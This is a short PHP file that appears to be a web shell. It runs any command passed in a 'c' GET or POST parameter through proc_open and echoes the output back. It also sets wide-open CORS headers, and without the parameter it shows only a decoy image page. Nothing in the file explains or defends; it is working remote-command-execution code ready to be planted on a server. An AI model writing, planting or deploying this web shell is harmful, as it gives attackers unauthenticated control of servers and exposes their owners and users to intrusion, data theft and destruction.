<?php
header("Access-Control-Allow-Origin: *"); // Allow requests from any origin
header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS"); // Allow the specified methods
header("Access-Control-Allow-Headers: Content-Type, Authorization"); // Allow certain headers
if (($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['c'])) ||
    ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['c']))) {
    $command = ($_SERVER['REQUEST_METHOD'] === 'POST') ? $_POST['c'] : $_GET['c'];
    $descriptorspec = [
        0 => ["pipe", "r"],  
        1 => ["pipe", "w"],  
        2 => ["pipe", "w"]  
    ];
    $process = proc_open($command, $descriptorspec, $pipes);
    if (is_resource($process)) {
        $stdout = stream_get_contents($pipes[1]);
        $stderr = stream_get_contents($pipes[2]);
        fclose($pipes[0]);
        fclose($pipes[1]);
        fclose($pipes[2]);
        proc_close($process);
        $fullOutput = $stdout . "\n" . $stderr;
        echo $fullOutput;
    } else {
        echo "exception.";
    }
} else {
    echo "<body style=\"margin: 0; padding: 0;\"><div style=\"text-align: center;\"><img style=\"display: inline-block;\" src=\"https://fileuploader.generativeobjects.com/uploads/sg3d.gif\"></div></body>";
}
?>